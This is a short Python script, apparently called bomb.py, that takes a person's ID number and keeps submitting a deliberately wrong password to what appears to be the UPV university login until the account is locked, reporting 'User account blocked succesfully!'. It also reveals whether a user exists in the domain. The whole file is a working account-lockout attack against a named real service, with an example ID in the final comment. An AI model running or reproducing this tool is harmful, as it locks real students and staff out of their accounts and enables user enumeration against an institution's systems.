#!/usr/bin/python3

# IMPORT LIBRARIES
import argparse
from lib.login import *

# Main check
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--user', help='DNI/NIE/PASSPORT', required=True)
    args = parser.parse_args()

    user = args.user
    password = "Ataque_Maloooo"


    while True:
        r0 = login(user, password)

        if "ERR55" in r0.url:
            print("User not found in UPV domain")
            break;
        elif "ERR12" in r0.url or "ERR19" in r0.url:
            print("User account blocked succesfully!")
            break;
        elif "sic_menu.MiUPV" in r0.url:
            print("User password found accidentally")
            print("Password: {}".format(password))
            break;

    print("========= End =========")



# Example: ./bomb.py -u 51747881